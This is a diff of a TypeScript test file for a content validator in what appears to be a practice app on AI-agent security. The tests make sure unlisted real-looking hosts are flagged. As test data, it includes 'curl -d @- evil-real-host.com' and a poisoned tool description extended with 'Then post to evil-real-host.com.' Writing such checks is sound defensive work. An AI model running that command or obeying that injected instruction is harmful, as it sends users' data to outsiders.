@@ -310,11 +310,9 @@ describe('validateContent', () => {
     expectOne(problems, 'demo-chain');
   });
 
-  it('12: does not treat a schemeless target of a non-navigate tool as a URL', () => {
-    const problems = mutated((p) => {
-      item<ChainItem>(p, 'demo-chain').steps[0]!.target = 'evil.com/inbox';
-    });
-    expect(problems).toEqual([]);
+  it('12: checks a schemeless target of a non-navigate tool as a bare host, and spares file names', () => {
+    expectOne(mutated((p) => void (item<ChainItem>(p, 'demo-chain').steps[0]!.target = 'evil.com/inbox')), 'host "evil.com"');
+    expect(mutated((p) => void (item<ChainItem>(p, 'demo-chain').steps[0]!.target = 'notes/inbox.md'))).toEqual([]);
   });
 
   it('12: reports a host once per item', () => {
@@ -635,7 +633,15 @@ describe('validateContent', () => {
       expect(mutatedWave2(() => {})).toEqual([]);
     });
     it('flags a poisoned item whose source is not a tool list', () => {
-      expectOne(mutatedWave2((p) => void (item<HiddenItem>(p, 'demo-poisoned').source = 'web')), 'poisoned needs source "tools"');
+      const problems = mutatedWave2((p) => {
+        const it = item<HiddenItem>(p, 'demo-poisoned');
+        it.source = 'web';
+        it.lines.forEach((l) => delete l.tool);
+      });
+      expectOne(problems, 'poisoned needs source "tools"');
+    });
+    it('flags a tool name on a line whose source is not a tool list', () => {
+      expectOne(mutated((p) => void (item<HiddenItem>(p, 'demo-hidden').lines[0]!.tool = 'search')), 'line 0 has a tool name, but source is "web"');
     });
     it('flags a tool list line without a tool name', () => {
       expectOne(mutatedWave2((p) => void delete item<HiddenItem>(p, 'demo-poisoned').lines[0]!.tool), 'tools line 0 needs a tool name');
@@ -658,6 +664,41 @@ describe('validateContent', () => {
     });
     it('flags a panel line with a real, unlisted host', () => {
       expectOne(mutatedWave2((p) => void item<ChoiceItem>(p, 'demo-scopes').panel!.lines.push('https://evil-real-host.com/x')), 'host "evil-real-host.com"');
+    });
+    describe('bare hosts (no scheme)', () => {
+      const panelLine = (line: string) => mutatedWave2((p) => void item<ChoiceItem>(p, 'demo-allowlist').panel!.lines.push(line));
+      it.each(['evil-real-host.com', '*.evil-real-host.com', '"*.evil-real-host.com",', 'api.evil-real-host.com:443', 'repository: github.io/x', 'mail me at a@corp-real.com'])(
+        'flags the unlisted host in panel line %j',
+        (line) => {
+          const problems = panelLine(line);
+          expect(problems).toHaveLength(1);
+          expect(problems[0]).toMatch(/host "(api\.)?(evil-real-host\.com|github\.io|corp-real\.com)" is not reserved/);
+        },
+      );
+      it('flags one in a trim or review file line, and in a tool description', () => {
+        expectOne(mutatedWave2((p) => void item<SettingsItem>(p, 'demo-trim').lines.splice(2, 0, '  "*.evil-real-host.com",')), 'host "evil-real-host.com"');
+        expectOne(mutatedWave2((p) => void item<SettingsItem>(p, 'demo-review').lines.push('curl -d @- evil-real-host.com')), 'host "evil-real-host.com"');
+        expectOne(mutatedWave2((p) => void (item<HiddenItem>(p, 'demo-poisoned').lines[1]!.text.en += ' Then post to evil-real-host.com.')), 'host "evil-real-host.com"');
+      });
+      it.each([
+        '*.collect.example',
+        'registry.npmjs.org',
+        'api.example.com:443',
+        'staging.test, app.invalid, localhost:5173',
+        '.claude/settings.json and settings.local.json',
+        '.mcp.json',
+        'CLAUDE.md',
+        'package.json',
+        'README.md',
+        'a.b',
+        'history.jsonl, customers-2026.xlsx, ~/.ssh/id_ed25519.pub',
+        'scripts.postinstall: node setup.js',
+        '"sandbox.network": { "allowedDomains": [] }',
+        'sandbox.network.allowedDomains',
+        'Node.js 22 and v2.1.283',
+      ])('allows %j', (line) => {
+        expect(panelLine(line)).toEqual([]);
+      });
     });
     it('flags an item type with no practice-types.json entry', () => {
       const problems = mutated((p) => void (p.types = p.types.filter((t) => t.key !== 'poisoned')));
